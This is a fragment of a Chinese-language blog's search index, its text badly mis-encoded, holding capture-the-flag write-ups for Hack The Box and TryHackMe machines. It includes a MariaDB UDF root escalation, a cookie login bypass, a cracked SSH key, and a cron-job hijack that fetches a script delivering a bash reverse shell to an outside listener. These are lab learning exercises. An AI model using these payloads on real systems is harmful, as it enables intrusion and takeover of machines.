ä¸Šå»\n\nç„¶åæŒ‰ç…§ exp é‡Œçš„æ•™ç¨‹ï¼Œä¸€æ­¥æ­¥æ‰§è¡Œ\n\n```bash\n$ cd /tmp\n$ gcc -g -c raptor_udf2.c\n$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o $ raptor_udf2.so raptor_udf2.o -lc\n$ mysql -u root -p # root:Nildogg36\nMariaDB [(none)]> use mysql;\nMariaDB [mysql]> create table foo(line blob);\nMariaDB [mysql]> insert into foo values(load_file('/tmp/raptor_udf2.so'));\nMariaDB [mysql]> show variables like '%plugin%';\nMariaDB [mysql]> select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';\nMariaDB [mysql]> create function do_system returns integer soname 'raptor_udf2.so';\nMariaDB [mysql]> select * from mysql.func;\nMariaDB [mysql]> select do_system('cat /root/root.txt > /tmp/flag.txt;chown svc:svc /tmp/flag.txt');\nMariaDB [mysql]> \\! sh\n$ cat /tmp/flag.txt\n```\nç„¶åå°±å¯ä»¥å¾—åˆ° root æƒé™çš„ flag æ–‡ä»¶äº†","tags":["Hackthebox"]},{"title":"Overpass - TryHackMe","url":"/2022/05/05/TryHackMe/TryHackMe-Overpass/","content":"\n# é¶åœºä»‹ç»\n\nå½“ä¸€ç¾¤ç ´äº§çš„è®¡ç®—æœºç§‘å­¦ä¸“ä¸šçš„å­¦ç”Ÿå°è¯•åˆ¶ä½œå¯†ç ç®¡ç†å™¨æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿæ˜¾ç„¶æ˜¯ä¸€æ¬¡*å®Œç¾*çš„å•†ä¸šæˆåŠŸï¼\n\nè¿™ä¸ªç›’å­ä¸Šéšè—ç€ä¸€ä¸ª TryHackMe è®¢é˜…ä»£ç ã€‚ç¬¬ä¸€ä¸ªæ‰¾åˆ°å¹¶æ¿€æ´»å®ƒçš„äººå°†è·å¾—ä¸€ä¸ªæœˆçš„å…è´¹è®¢é˜…ï¼å¦‚æœæ‚¨å·²ç»æ˜¯è®¢é˜…è€…ï¼Œä¸ºä»€ä¹ˆä¸å°†ä»£ç æä¾›ç»™æœ‹å‹å‘¢ï¼Ÿ\n\næ›´æ–°ï¼šè¯¥ä»£ç ç°å·²å£°æ˜ã€‚æœºå™¨äº 2020/09/25 ç¨ä½œä¿®æ”¹ã€‚è¿™åªæ˜¯ä¸ºäº†æé«˜æœºå™¨çš„æ€§èƒ½ã€‚å®ƒä¸å½±å“è¯¥è¿‡ç¨‹ã€‚\n\n# é¶åœºåœ°å€\n\n[https://tryhackme.com/room/overpass](https://tryhackme.com/room/overpass)\n\n# ä¿¡æ¯æ”¶é›†\n\n## Nmap\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.29.27\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-05-05 19:44 CST\nNmap scan report for 10.10.29.27\nHost is up (0.15s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)\n|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)\n|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)\n80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\n|_http-title: Overpass\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=5/5%OT=22%CT=1%CU=34521%PV=Y%DS=2%DC=T%G=Y%TM=6273B8D1\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11\nOS:NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(\nOS:R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 1723/tcp)\nHOP RTT       ADDRESS\n1   151.63 ms 10.18.0.1\n2   152.12 ms 10.10.29.27\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 46.80 seconds\n```\n\n## HTTP\n\n![](TryHackMe-Overpass/image.png)\n\næ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œå» FUZZ ä¸€ä¸‹\n\n## FUZZ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# gobuster dir -u http://10.10.29.27/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.29.27/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/05/05 07:54:43 Starting gobuster in directory enumeration mode\n===============================================================\n/img                  (Status: 301) [Size: 0] [--> img/]\n/downloads            (Status: 301) [Size: 0] [--> downloads/]\n/aboutus              (Status: 301) [Size: 0] [--> aboutus/]  \n/admin                (Status: 301) [Size: 42] [--> /admin/]  \n/css                  (Status: 301) [Size: 0] [--> css/]\n```\n\næœ‰ä¸€ä¸ª /admin ç›®å½•ï¼Œè¿›å»çœ‹ä¸€ä¸‹\n\n![](TryHackMe-Overpass/image1.png)\n\nä¸€ä¸ªç™»é™†é¡µé¢ï¼Œä½¿ç”¨å¼±å£ä»¤æ²¡æœ‰è¿›å»ï¼Œçœ‹ä¸€ä¸‹æºä»£ç \n\nåœ¨é¡µé¢ [http://10.10.29.27/login.js](http://10.10.29.27/login.js) ä¸­æ‰¾åˆ°äº†ä¸€å¥\n\n```bash\nCookies.set(\"SessionToken\",statusOrCookie)\n```\n\nåŒæ—¶åœ¨ [http://10.10.29.27/main.js](http://10.10.29.27/main.js) è¿˜æœ‰ä¸€ä¸ªå†…å®¹\n\n```bash\nconsole.log(\"Hello, World!\")\n```\n\nè¿™é‡Œåº”è¯¥æ˜¯ Cookie è®¾ç½®ç»•è¿‡\n\n# æ¼æ´åˆ©ç”¨\n\næŒ‰ F12 æ‰“å¼€æ§åˆ¶å°\n\n![](TryHackMe-Overpass/image2.png)\n\nè¿™é‡Œä¹Ÿç¡®å®è¾“å‡ºäº† â€œHello, Worldâ€\n\nè¿™é‡Œä¿®æ”¹æˆ‘ä»¬çš„ Payload\n\n```bash\nCookies.set(\"SessionToken\", \"\")\n```\n\nåœ¨æ§åˆ¶å°è¾“å…¥ä»¥åï¼Œåˆ·æ–°\n\n![](TryHackMe-Overpass/image3.png)\n\nç›´æ¥ç»•è¿‡äº†ç™»é™†æœºåˆ¶ï¼Œæ‹¿åˆ°äº†ç”¨æˆ· james çš„ sshkey\n\n```bash\n-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337\n\nLNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN\nJHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal\n73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT\nWDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv\nBMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ\nAL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR\n3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf\nABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk\nVfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR\nOkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P\n9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze\neaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ\n4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8\nGFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn\nexxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy\nAIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk\n6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58\ndPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i\nn0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT\n8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K\n4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z\nylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS\n49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2\n+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk\n2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7\n-----END RSA PRIVATE KEY-----\n```\n\nå°† sshkey ä¿å­˜åˆ° id_rsa ä¸­ï¼Œå¹¶ç»™äºˆæƒé™\n\n```bash\nchmod 600 id_rsa\n```\n\næ¥ç€ä½¿ç”¨ ssh è¿›è¡Œç™»é™†\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~/Desktop]\nâ””â”€# ssh james@10.10.84.23 -i id_rsa\nThe authenticity of host '10.10.84.23 (10.10.84.23)' can't be established.\nECDSA key fingerprint is SHA256:4P0PNh/u8bKjshfc6DBYwWnjk1Txh5laY/WbVPrCUdY.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.84.23' (ECDSA) to the list of known hosts.\nEnter passphrase for key 'id_rsa':\n```\n\næ˜¾ç¤ºéœ€è¦è¾“å…¥å¯†ç ï¼Œå»ç ´è§£ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~/Desktop]\nâ””â”€# ssh2john id_rsa > hash\n\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~/Desktop]\nâ””â”€# cat hash\nid_rsa:$sshng$1$16$9F85D92F34F42626F13A7493AB48F337$1200$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c98987387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b\n```\n\nç„¶åä½¿ç”¨ john è¿›è¡Œçˆ†ç ´\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~/Desktop]\nâ””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hash                                                                            1 â¨¯\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\njames13          (id_rsa)\n1g 0:00:00:00 DONE (2022-05-05 20:27) 12.50g/s 167200p/s 167200c/s 167200C/s lisa..honolulu\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\n\nè¿™é‡Œçˆ†ç ´å‡ºæ¥äº†å¯†ç ä¸º james13 å»å°±è¿›è¡Œè¿æ¥\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~/Desktop]\nâ””â”€# ssh james@10.10.84.23 -i id_rsa\nEnter passphrase for key 'id_rsa':\nWelcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Thu May  5 12:32:51 UTC 2022\n\n  System load:  0.09               Processes:           92\n  Usage of /:   22.3% of 18.57GB   Users logged in:     0\n  Memory usage: 12%                IP address for eth0: 10.10.84.23\n  Swap usage:   0%\n\n47 packages can be updated.\n0 updates are security updates.\n\nLast login: Sat Jun 27 04:45:40 2020 from 192.168.170.1\njames@overpass-prod:~$ whoami&&id\njames\nuid=1001(james) gid=1001(james) groups=1001(james)\n```\n\næˆåŠŸæ‹¿åˆ° user æƒé™\n\n```bash\njames@overpass-prod:~$ ls\ntodo.txt  user.txt\njames@overpass-prod:~$ cat user.txt\nthm{65c1aaf000506e56996822c6281e6bf7}\n```\n\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n\n```bash\njames@overpass-prod:~$ cat todo.txt\nTo Do:\n> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough\n> Write down my password somewhere on a sticky note so that I don't forget it.\n  Wait, we make a password manager. Why don't I just use that?\n> Test Overpass for macOS, it builds fine but I'm not sure it actually works\n> Ask Paradox how he got the automated build script working and where the builds go.\n  They're not updating on the website\n```\n\nè¿™æœ‰ä¸ª todo.txt æ–‡ä»¶ä½œä¸ºæç¤ºï¼Œä¸è¿‡æˆ‘è‹±è¯­ä¸å¥½ï¼Œä¹Ÿä¸ç¡®å®šè¯´çš„å•¥ï¼Œè¿˜æ˜¯å…ˆè·‘ä¸ª LinPeas çœ‹çœ‹å§\n\n```bash\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash\n```\n\nè¿™é‡Œçœ‹åˆ°ä¸€ä¸ªï¼Œroot ä¼šä½¿ç”¨ curl å‘ overpass.htm/downloads/src/buildscrit.sh è¯·æ±‚å†…å®¹ï¼Œç„¶åä½¿ç”¨ bash æ‰§è¡Œ\n\n```bash\nâ•”â•â•â•â•â•â•â•â•â•â•â•£ Hostname, hosts and DNS\noverpass-prod\n127.0.0.1 localhost\n127.0.1.1 overpass-prod\n127.0.0.1 overpass.thm\n::1     ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n\nnameserver 127.0.0.53\noptions edns0\nsearch eu-west-1.compute.internal\n```\n\nç„¶ååœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ° overpass.htm æ˜¯æŒ‡å‘çš„ 127.0.0.1\n\n```bash\njames@overpass-prod:~$ ls -la /etc/hosts\n-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts\n```\n\nè¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æ˜¯æœ‰æƒé™ä¿®æ”¹ /etc/hosts çš„å†…å®¹çš„\n\né‚£ææƒæ€è·¯å°±æœ‰äº†\n\né¦–å…ˆåˆ›å»ºæŒ‡å®šçš„ç›®å½•å’Œè„šæœ¬\n\n```bash\nmkdir -p downloads/src && vim downloads/src/buildscript.sh\n```\n\nç„¶åå†™å…¥æˆ‘ä»¬çš„ payload\n\n```bash\nbash -c 'exec bash -i &>/dev/tcp/10.18.112.117/4444 <&1'\n```\n\næ¥ç€éœ€è¦ä¸¤ä¸ªçª—å£\n\nç¬¬ä¸€ä¸ªçª—å£ ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 4444\n```\n\nç¬¬äºŒä¸ªçª—å£ ä½¿ç”¨ python3 å¼€å¯ä¸€ä¸ª http æœåŠ¡\n\n```bash\npython3 -m http.server 80\n```\n\nç„¶åå» shell é‡Œä¿®æ”¹ /etc/hosts çš„å†…å®¹\n\n```bash\n10.18.112.117 overpass.thm\n```\n\næŠŠç¬¬ä¸‰è¡Œæ”¹æˆè¿™æ ·ï¼Œç„¶åç­‰ç€å°±è¡Œäº†\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# python3 -m http.server 80  \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.84.23 - - [05/May/2022 09:17:01] \"GET /downloads/src/buildscript.sh HTTP/1.1\" 200 -\n```\n\næˆåŠŸä¸‹è½½äº†æˆ‘ä»¬çš„ payload\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.18.112.117] from (UNKNOWN) [10.10.84.23] 43604\nbash: cannot set terminal process group (16146): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@overpass-prod:~# whoami&&id\nwhoami&&id                                                                                                                                    \nroot                                                                                                                                          \nuid=0(root) gid=0(root) groups=0(root)\n```\n\næˆåŠŸæ‹¿åˆ°äº† root æƒé™\n\n```bash\nroot@overpass-prod:~# ls                                                                                                                      \nls                                                                                                                                            \nbuildStatus                                                                                                                                   \nbuilds                                                                                                                                        \ndownloads                                                                                                                                     \ngo                                                                                                                                            \nroot.txt                                                                                                                                      \nsrc                                                                                                                                           \nroot@overpass-prod:~# cat root.txt                                                                                                            \ncat root.txt                                                                                                                                  \nthm{7f336f8c359dbac18d54fdd64ea753bb}\n```\n\næˆåŠŸæ‹¿åˆ°äº† root æƒé™çš„ flag æ–‡ä»¶\n","tags":["TryHackMe"]},{"title":"Irked - Hackthebox","url":"/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/","content":"\n# Hackthebox - Irked\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Irked/2e3a4dff-7102-4a8c-847b-44463ff7d309.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Irked/d9b9ac71-2069-422f-bca0-f2e16f6b89a1.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.117                                                                                                                                        1 âš™\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-29 10:23 CST\nNmap scan report for 10.10.10.117\nHost is up (0.17s latency).\nNot shown: 65528 closed ports\nPORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)\n| ssh-hostkey:\n|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)\n|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)\n|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)\n|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)\n80/tcp    open  http    Apache httpd 2.4.10 ((Debian))\n|_http-server-header: Apache/2.4.10 (Debian)\n|_http-title: Site doesn't have a title (text/html).\n111/tcp   open  rpcbind 2-4 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100024  1          49297/tcp   status\n|   100024  1          50541/udp   status\n|   100024  1          51791/udp6  status\n|_  100024  1          60368/tcp6  status\n6697/tcp  open  irc     UnrealIRCd\n8067/tcp  open  irc     UnrealIRCd\n49297/tcp open  status  1 (RPC #100024)\n65534/tcp open  irc     UnrealIRCd\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=4/29%OT=22%CT=1%CU=32566%PV=Y%DS=2%DC=T%G=Y%TM=626B4C5\nOS:E%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS\nOS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1\nOS:1NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN\nOS:(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 143/tcp)\nHOP RTT       ADDRESS\n1   170.14 ms 10.10.14.1\n2   170.23 ms 10.10.10.117\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 47.84 seconds\n```\nè¿™è¾¹æœ‰ä¸€ä¸ª 111 ç«¯å£ï¼Œçœ‹ç€åƒæ˜¯ rpcbind æ–¹é¢çš„æ¼æ´ï¼Œå¥½åƒæ˜¯ç¼“å†²åŒºæº¢å‡ºç›¸å…³çš„ï¼Œä½¿ç”¨ msf æ£€æŸ¥è¯•è¯•\n\n## Metasploit\n```bash\nmsf6 auxiliary(scanner/misc/sunrpc_portmapper) > show options \n\nModule options (auxiliary/scanner/misc/sunrpc_portmapper):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   PROTOCOL  tcp              yes       Protocol to use (Accepted: tcp, udp)\n   RHOSTS    10.10.10.117     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT     111              yes       The target port (TCP)\n   THREADS   1                yes       The number of concurrent threads (max one per host)\n```\nè®¾ç½®å¥½åå»æ‰§è¡Œ\n\n```bash\nmsf6 auxiliary(scanner/misc/sunrpc_portmapper) > exploit \n\n[+] 10.10.10.117:111      - SunRPC Programs for 10.10.10.117\n================================\n\n Name     Number  Version  Port   Protocol\n ----     ------  -------  ----   --------\n rpcbind  100000  4        111    tcp\n rpcbind  100000  3        111    tcp\n rpcbind  100000  2        111    tcp\n rpcbind  100000  4        111    udp\n rpcbind  100000  3        111    udp\n rpcbind  100000  2        111    udp\n status   100024  1        50541  udp\n status   100024  1        49297  tcp\n\n[*] 10.10.10.117:111      - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\næ‰«æåˆ°äº†ï¼Œä½†æ˜¯æ— æ³•åˆ©ç”¨æˆåŠŸï¼Œæ¢ä¸ªå…¶ä»–åœ°æ–¹ç»§ç»­çœ‹\n\n## HTTP\n![](Hackthebox-Irked/9b0067e6-70a4-48bc-bdd0-e6435cb989cb.png)\n\nWeb æœåŠ¡æç¤º IRC å¯ä»¥æ­£å¸¸å·¥ä½œï¼Œè¿™é‡Œ 6697ã€8067ã€65534 ä¼¼ä¹éƒ½æ˜¯ IRC æœåŠ¡ï¼Œå»æœç´¢ä¸€ä¸‹ IRC æ˜¯ä»€ä¹ˆä¸œè¥¿\n\n![](Hackthebox-Irked/dcdac2f8-04a4-4d5e-bcf7-5b284ac7d6e4.png)\n\næœç´¢ WIKI å‘ç°ï¼ŒIRC æ˜¯ä¸€ç§åº”ç”¨å±‚çš„åè®®ï¼Œä¸»è¦ç”¨äºç¾¤ä½“èŠå¤©ï¼Œé€šå¸¸ä½¿ç”¨çš„ç«¯å£æ˜¯ 6667 å’Œ 6697ï¼Œæ­£å¥½æˆ‘ä»¬è¿™é‡Œæœ‰ 6697\n\n# 